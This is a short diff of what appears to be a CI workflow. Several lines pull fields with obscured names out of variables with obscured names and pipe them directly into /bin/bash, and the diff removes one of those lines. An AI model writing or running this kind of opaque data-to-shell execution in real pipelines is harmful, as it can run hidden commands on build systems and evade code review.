@@ -24,7 +24,6 @@ jobs:
           echo $r35013 | jq -r .qku093 | /bin/bash
           printf '%s' "$kxbj37" | jq -r .wvxz02 | /bin/bash
           printf '%s' "$c07659" | jq -r .jyp86 | /bin/bash
-          echo $k09 | jq -r .o76 | /bin/bash
           echo $d39122 | jq -r .eussz3858 | /bin/bash
 
       - name: Save output
